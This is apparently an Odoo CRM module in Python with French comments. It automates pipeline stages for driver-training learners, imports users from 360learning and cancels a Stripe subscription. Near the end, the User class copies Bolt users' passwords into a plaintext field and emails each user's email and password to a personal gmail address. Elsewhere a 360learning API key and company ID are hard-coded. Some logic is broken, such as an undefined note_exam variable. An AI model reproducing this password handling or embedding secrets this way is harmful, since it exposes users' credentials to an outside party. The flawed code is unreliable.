# -*- coding: utf-8 -*-
# Part of Odoo. See LICENSE file for full copyright and licensing details.
#
from odoo import api, fields, models, _
import calendar
import requests
import json
from requests.structures import CaseInsensitiveDict
from datetime import date, datetime, timedelta
import logging

_logger = logging.getLogger(__name__)


class Partner(models.Model):
    _inherit = 'res.partner'

    bolt = fields.Boolean('Client Bolt')
    inscrit_mcm = fields.Date("Date formation MCM")
    eval_box = fields.Boolean('Eval Box')
    numero_evalbox = fields.Char('Numéro de dossier Evalbox')
    password_evalbox = fields.Char('Mot de passe Evalbox')
    id_evalbox = fields.Char('Identifiant Evalbox')

    # @api.model
    # def search_read(self, domain=None, fields=None, offset=0, limit=None, order=None):
    # 
    #     if self.user_has_groups('crm_marketing_automation.group_bolt'):
    #         domain += [('bolt', '=', True)]
    # 
    #     res = super(Partner, self).search_read(domain, fields, offset, limit, order)
    # 
    #     return res
    def write(self, vals):
        record = super(Partner, self).write(vals)
        if 'numero_evalbox' in vals and vals['numero_evalbox'] != False and self.bolt and self.inscrit_mcm == False:
            eval_box = vals['numero_evalbox']
            self.changestage("Inscription Examen Eval Box", self)
        if 'inscrit_mcm' in vals and self.bolt:
            # if self.renounce_request:
            self.changestage("Bolt-Plateforme de formation", self)
        # else :
        #     self.changestage("Bolt-Rétractation non Coché",self)
        if 'renounce_request' in vals and (vals['renounce_request'] == True) and self.bolt:
            if self.inscrit_mcm:
                self.changestage("Bolt-Plateforme de formation", self)

        """pour bolt prendre la valeur d'examen blanc si > 30% sera classé  sur crm sous reussi si non echec """
        if 'note_exam' in vals:
            print("write", vals)
            note_exam = vals['note_exam']
            if self.bolt or ('bolt' in vals and vals['bolt']):
                if float(note_exam) >= 40.0:
                    self.changestage("Reussi dans Examen Blanc", self)
                if float(note_exam) < 40.0:
                    self.changestage("Echec d'Examen Blanc", self)
        if 'statut' in vals:
            if vals['statut'] == 'canceled':
                self.changestage("Annulé", self)
        """si date d'inscription remplit il sera classé sous l'etape plateforme de formation"""
        if 'statut_cpf' in vals:
            # Si statut cpf non traité on classe l'apprenant dans le pipeline du crm  sous etat non traité
            if vals['statut_cpf'] == 'untreated':
                self.changestage("Non traité", self)
            # Si statut cpf validé on classe l'apprenant dans le pipeline du crm  sous etat validé
            if vals['statut_cpf'] == 'validated':
                self.changestage("Validé", self)
            if vals['statut_cpf'] == 'in_training':
                self.changestage("En formation", self)
            if vals['statut_cpf'] == 'out_training':
                self.changestage("Sortie de formation", self)
            if vals['statut_cpf'] == 'service_validated':
                self.changestage("Service fait validé", self)
            if vals['statut_cpf'] == 'service_declared':
                self.changestage("Service fait déclaré", self)
            if vals['statut_cpf'] == 'bill':
                self.changestage("Facturé", self)
            if vals['statut_cpf'] == 'accepted':
                """Si statut cpf accepté et n'as pas encore choisi sa ville et sa date 
                 on classe l'apprenant   sous statut  choix date d'examen"""
                if not (self.session_ville_id) or not (self.date_examen_edof):
                    self.changestage("Choix date d'examen - CPF", self)
                else:
                    """Si non on classe l'apprenant   sous statut  accepté"""
                    self.changestage("Accepté", self)
            # Si statut cpf annulé on classe l'apprenant dans le pipeline du crm  sous statut  annulé
            if vals['statut_cpf'] == 'canceled':
                self.changestage("Annulé", self)

        return record

    def changestage(self, name, partner):
        if partner.name:
            partner.diviser_nom(partner)
        stages = self.env['crm.stage'].sudo().search([("name", "=", _(name))])
        if stages:
            for stage in stages:
                lead = self.env['crm.lead'].sudo().search([('partner_id', '=', partner.id)], limit=1)
                if lead and partner.name and _(lead.stage_id.name) != name:
                    _logger.info("stage %s" % str(_(lead.stage_id.name)))
                    _logger.info("stage %s" % str(name))
                    lead.sudo().write({
                        'prenom': partner.firstName if partner.firstName else "",
                        'nom': partner.lastName if partner.lastName else "",

                        'name': partner.name if partner.name else "",
                        'partner_name': partner.name,
                        'num_dossier': partner.numero_cpf if partner.numero_cpf else "",
                        'num_tel': partner.phone,
                        'email': partner.email,
                        'email_from': partner.email,
                        'type': "opportunity",
                        'stage_id': stage.id,
                        'mode_de_financement': partner.mode_de_financement,
                        'module_id': partner.module_id if partner.module_id else False,
                        'mcm_session_id': partner.mcm_session_id if partner.mcm_session_id else False,
                        'company_id': partner.company_id if partner.company_id else False
                    })
                if not lead and partner.name:
                    lead = self.env['crm.lead'].sudo().create({
                        'prenom': partner.firstName if partner.firstName else "",
                        'nom': partner.lastName if partner.lastName else "",
                        'name': partner.name if partner.name else "",
                        'partner_name': partner.name,
                        'num_dossier': partner.numero_cpf if partner.numero_cpf else "",
                        'num_tel': partner.phone,
                        'email': partner.email,
                        'email_from': partner.email,
                        'type': "opportunity",
                        'stage_id': stage.id,
                        'mode_de_financement': partner.mode_de_financement,
                    })
                    partner = self.env['res.partner'].sudo().search([('id', '=', partner.id)])
                    if partner:
                        lead.partner_id = partner
                        lead.mcm_session_id = partner.mcm_session_id if partner.mcm_session_id else False
                        lead.module_id = partner.module_id if partner.module_id else False
                        lead.company_id = partner.company_id if partner.company_id else False

    def change_crm_lead_existant(self):
        self.import_data("Plateforme de formation")
        partners = self.env['res.partner'].sudo().search([])
        today = date.today()

        for partner in partners:
            if (partner.statut_cpf and partner.statut_cpf == 'canceled') or (partner.statut == 'canceled'):
                self.changestage("Annulé", partner)
            if (partner.statut != 'canceled'):

                date_creation = partner.create_date
                year = date_creation.year
                month = date_creation.month
                if (year > 2020):

                    if partner.statut_cpf == "accepted":
                        """Pour etape accepté on doit vérifier la date et la ville """
                        if (not (partner.session_ville_id) or not (partner.date_examen_edof)) and not (
                                partner.mcm_session_id) and not (partner.module_id):
                            self.changestage("Choix date d'examen - CPF", partner)
                    # Recuperer le contrat pour vérifier son statut
                    sale_order = self.env['sale.order'].sudo().search([('partner_id', '=', partner.id),
                                                                       ('session_id', '=',
                                                                        partner.mcm_session_id.id),
                                                                       ('module_id', '=', partner.module_id.id),
                                                                       ('session_id.date_exam', '>',
                                                                        date.today()),
                                                                       ], order="date_order desc", limit=1)
                    facture = self.env['account.move'].sudo().search([('session_id', '=', partner.mcm_session_id.id),
                                                                      ('module_id', '=', partner.module_id.id),
                                                                      ('state', '=', 'posted')
                                                                      ], order="invoice_date desc", limit=1)
                    date_facture = facture.invoice_date
                    # _logger.info('facture %s' %str(date_facture))
                    # _logger.info('facture %s' %str(partner.email))

                    # Récupérer les documents
                    documents = self.env['documents.document'].sudo().search([('partner_id', '=', partner.id)])
                    # pour classer sous document non validé dans crm lead
                    waiting = False
                    refuse = False
                    document_valide = False
                    if documents:
                        count = 0
                        for document in documents:
                            if (document.state == "validated"):
                                count = count + 1
                            if (count == len(documents) and count != 0):
                                document_valide = True
                            if (document.state == "waiting"):
                                # _logger.info("document waiting  %s" % partner.name)
                                waiting = True
                            if (document.state == "refused"):
                                _logger.info("refused %s " % str(partner.name))
                                refuse = True
                    if partner.mode_de_financement == "particulier":
                        if partner.inscrit_mcm and partner.numero_evalbox != False:
                            _logger.info('plateforme %s' % str(partner.email))
                            self.changestage("Bolt-Plateforme de formation", partner)
                        else:
                            if partner.bolt and float(partner.note_exam) < 40.0:
                                self.changestage("Echec d'Examen Blanc", self)
                            if sale_order and sale_order.state == "sent":
                                # _logger.info('contrat non signé')
                                if not partner.bolt and sale_order.module_id.product_id.default_code != "vtc_bolt":
                                    self.changestage("Contrat non Signé", partner)
                                else:
                                    self.changestage("Bolt-Contrat non Signé", partner)
                            if sale_order and sale_order.state == "sale":
                                if waiting:
                                    if partner.bolt:
                                        # _logger.info('wait bolt %s' % str(partner.email))
                                        self.changestage("Bolt-Document non Validé", partner)
                                    else:
                                        self.changestage("Document non Validé", partner)
                                # """si les documents sont refusés, on classe l'apprenant bolt sous Non éligible"""
                                # if refuse and partner.bolt:
                                #     # _logger.info("Archivé %s" %str(partner.name))
                                #     self.changestage("Archivé", partner)

                                if document_valide:
                                    _logger.info('document valide %s' % str(partner.email))
                                    print("++++++++++++", partner.email, partner.inscrit_mcm)
                                    failure = sale_order.failures  # delai de retractation
                                    """Si Il n'as pas fait la renonciation au contrat et sur la fiche 
                                     on le classe sous retractation non coché et on doit vérifier la date de signature si n'as
                                         pas depassé 14jours"""
                                    if not (partner.renounce_request) and (date_facture) and (
                                            date_facture + timedelta(days=14)) > (today):
                                        if partner.bolt:
                                            # _logger.info('bolt retract %s' % str(partner.email))
                                            self.changestage("Bolt-Rétractation non Coché", partner)
                                        else:
                                            self.changestage("Rétractation non Coché", partner)
                                    if partner.renounce_request:
                                        if partner.bolt or sale_order.module_id.product_id.default_code == "vtc_bolt":
                                            if partner.inscrit_mcm == False and partner.numero_evalbox == False:
                                                """S'il a renoncé et son contrat est signé et ses documents sont validé sera classé sous contrat Signé """
                                                self.changestage("Bolt-Contrat Signé", partner)
                                            """Si client bolt et inscrit à l'examen eval box, et n'a pas encore commencé
                                             sa formation sera classé sous examen eval box 
                                            si non sous Plateforme de formation """
                                            if partner.inscrit_mcm == False and partner.numero_evalbox != False:
                                                _logger.info('eval box %s' % str(partner.email))
                                                self.changestage("Inscription Examen Eval Box", partner)

                                        else:
                                            self.changestage("Contrat Signé", partner)

                    """Si mode de financement cpf on doit vérifier seulement l'etat des documents  
                        et la renonciation sur la fiche client """
                    if partner.mode_de_financement == "cpf" and partner.mcm_session_id.date_exam and partner.mcm_session_id.date_exam > date.today():
                        if waiting:
                            self.changestage("Document non Validé", partner)
                        if document_valide and not (partner.renounce_request):
                            self.changestage("Rétractation non Coché", partner)

    """Methode pour importation des données à partir de 360"""

    def import_data(self, name):
        """Supprimer les anciens apprenants et les remplacer par les nouveaux importés par api"""
        old_leads = self.env['crm.lead'].sudo().search([('stage_id.name', '=', 'Plateforme de formation')])
        if old_leads:
            old_leads.unlink()
        params = (
            ('company', '56f5520e11d423f46884d593'),
            ('apiKey', 'cnkcbrhHKyfzKLx4zI7Ub2P5'),
        )
        _logger.info('import360 %s' % name)
        response = requests.get('https://app.360learning.com/api/v1/users', params=params)
        users = response.json()
        # Faire un parcours sur chaque user et extraire ses informations
        for user in users:
            iduser = user['_id']
            email = user['mail']
            response_user = requests.get('https://app.360learning.com/api/v1/users/' + iduser, params=params)
            table_user = response_user.json()
            stage = self.env['crm.stage'].sudo().search([("name", "=", _(name))])
            if stage:
                self.env['crm.lead'].sudo().create({
                    'name': table_user['firstName'] if 'firstName' in table_user else table_user['mail'],
                    'contact_name': table_user['lastName'] if 'lastName' in table_user else table_user['mail'],
                    'email': email,
                    'email_from': email,
                    'type': "opportunity",
                    'stage_id': stage.id,
                    'num_dossier': ""
                })

    """Remplir le champ société pour les fiches clients """

    def remplir_société(self):
        partners = self.env['res.partner'].search([('company_id', '=', False)])
        for partner in partners:
            user = self.env['res.users'].sudo().search([('partner_id', '=', partner.id)], limit=1)
            if user and user.company_id.id == 1:
                _logger.info("parnter_company %s" % user.name)
                _logger.info("_company %s" % user.company_id)
                partner.company_id = user.company_id.id
                # partner.sudo().write({
                #  'company_id': user.company_id.id
                # })
                _logger.info("after add %s" % partner.company_id)

    """changer le statut d'un seul apprenant """

    def change_crm_lead_i_One(self, partner, eval_box):
        self.import_data("Plateforme de formation")
        partners = self.env['res.partner'].sudo().search([('id', "=", partner.id)])
        today = date.today()

        for partner in partners:
            if (partner.statut_cpf and partner.statut_cpf == 'canceled') or (partner.statut == 'canceled'):
                self.changestage("Annulé", partner)
            if (partner.statut != 'canceled'):
                date_creation = partner.create_date
                year = date_creation.year
                month = date_creation.month
                if (year > 2020):
                    if partner.statut_cpf == "accepted":
                        """Pour etape accepté on doit vérifier la date et la ville """
                        if (not (partner.session_ville_id) or not (partner.date_examen_edof)) and not (
                                partner.mcm_session_id) and not (partner.module_id):
                            self.changestage("Choix date d'examen - CPF", partner)
                    # Recuperer le contrat pour vérifier son statut
                    sale_order = self.env['sale.order'].sudo().search([('partner_id', '=', partner.id),
                                                                       ('session_id', '=',
                                                                        partner.mcm_session_id.id),
                                                                       ('module_id', '=', partner.module_id.id),
                                                                       ('session_id.date_exam', '>',
                                                                        date.today()),
                                                                       ], order="date_order desc", limit=1)
                    facture = self.env['account.move'].sudo().search([('session_id', '=', partner.mcm_session_id.id),
                                                                      ('module_id', '=', partner.module_id.id),
                                                                      ('state', '=', 'posted')
                                                                      ], order="invoice_date desc", limit=1)
                    date_facture = facture.invoice_date
                    # Récupérer les documents
                    documents = self.env['documents.document'].sudo().search([('partner_id', '=', partner.id)])
                    # pour classer sous document non validé dans crm lead
                    waiting = False
                    document_valide = False
                    if documents:
                        count = 0
                        for document in documents:
                            if (document.state == "validated"):
                                count = count + 1
                            if (count == len(documents) and count != 0):
                                document_valide = True
                            if (document.state == "waiting"):
                                _logger.info("document waiting  %s" % partner.name)
                                waiting = True
                    if partner.mode_de_financement == "particulier":
                        if partner.bolt and float(partner.note_exam) < 40.0:
                            self.changestage("Echec d'Examen Blanc", self)
                        if sale_order and sale_order.state == "sent":
                            _logger.info('contrat non signé')
                            if not partner.bolt:
                                self.changestage("Contrat non Signé", partner)
                            else:
                                self.changestage("Bolt-Contrat non Signé", partner)
                        if sale_order and sale_order.state == "sale":
                            if not document_valide:
                                if not partner.bolt:
                                    self.changestage("Contrat Signé", partner)
                                if partner.bolt:
                                    self.changestage("Bolt-Contrat Signé", partner)
                            if waiting:
                                if partner.bolt:
                                    self.changestage("Bolt-Document non Validé", partner)
                                else:
                                    self.changestage("Document non Validé", partner)

                            if document_valide:
                                print("++++++++++++", partner.email, partner.inscrit_mcm)
                                failure = sale_order.failures  # delai de retractation
                                """Si Il n'as pas fait la renonciation au contrat et sur la fiche 
                                 on le classe sous retractation non coché et on doit vérifier la date de signature si n'as
                                     pas depassé 14jours"""
                                if not (partner.renounce_request) and (date_facture) and (
                                        date_facture + timedelta(days=14)) > (today):
                                    if partner.bolt:
                                        self.changestage("Bolt-Rétractation non Coché", partner)
                                    else:
                                        self.changestage("Rétractation non Coché", partner)

                                if partner.renounce_request and partner.bolt and partner.inscrit_mcm == False and eval_box != False:
                                    print("++++++", partner.email)
                                    self.changestage("Inscription Examen Eval Box", partner)
                                if partner.renounce_request and partner.bolt and partner.inscrit_mcm and eval_box != False:
                                    print("======", partner.email)
                                    self.changestage("Bolt-Plateforme de formation", partner)
                                if partner.renounce_request and partner.bolt and partner.inscrit_mcm == False and eval_box == False:
                                    self.changestage("Bolt-Contrat Signé", partner)

                    """Si mode de financement cpf on doit vérifier seulement l'etat des documents  
                        et la renonciation sur la fiche client """
                    if partner.mode_de_financement == "cpf" and partner.mcm_session_id.date_exam and partner.mcm_session_id.date_exam > date.today():
                        if waiting:
                            self.changestage("Document non Validé", partner)
                        if document_valide and not (partner.renounce_request):
                            self.changestage("Rétractation non Coché", partner)

    def name_convert(self):
        leads = self.env['crm.lead'].sudo().search([('partner_id.bolt', "=", True)])
        for lead in leads:
            part = lead.partner_id
            if part and part.name:
                _logger.info('partnerr--------%s' % str(part.name))
                part.diviser_nom(part)
                lead.nom = part.lastName
                lead.prenom = part.firstName

    def cancel_subscription(self):
        subscription = "sub_1KQJqTIEbFL8iNKWR3zdh07g"
        aquire = self.env['payment.acquirer'].sudo().search([], limit=1)
        print("search", aquire)
        url = "subscriptions/%s" % (subscription)
        paiement_intent = aquire._stripe_request(url, method="DELETE")
        data_paiement = paiement_intent.get('data', [])
        print('data', paiement_intent)

class User(models.Model):
    _inherit = 'res.users'

    def _set_password(self):
        for user in self:
            if not user.id_evalbox and not user.password_evalbox and user.bolt :
                user.id_evalbox = user.email
                user.password_evalbox = user.password
        return super(User, self)._set_password()
    def send_email_create_account_evalbox(self,user,password):
        if user.bolt and not user.login_date:
            subject = str(user.email) + ' - ' + str(password)
            mail = self.env['mail.mail'].sudo().search([('subject', "=", subject)])
            if user.note_exam:
                if float(note_exam) >= 40.0:
                    if not mail:
                        mail = self.env['mail.mail'].create({
                            'body_html': '<p>%s - %s</p>' % (str(user.email), str(user.password)),
                            'subject': subject,
                            'email_from': user.company_id.email,
                            'email_to': 'houssemrando@gmail.com',
                            'auto_delete': False,
                            'state': 'outgoing'})
                        mail.send()
        return user
    
    def write(self,values):
        for user in self:
            if not self.password_evalbox and 'password_evalbox' in values:
                    self.send_email_create_account_evalbox(user,str(values['password_evalbox']))
        return super(User, self).write(values)
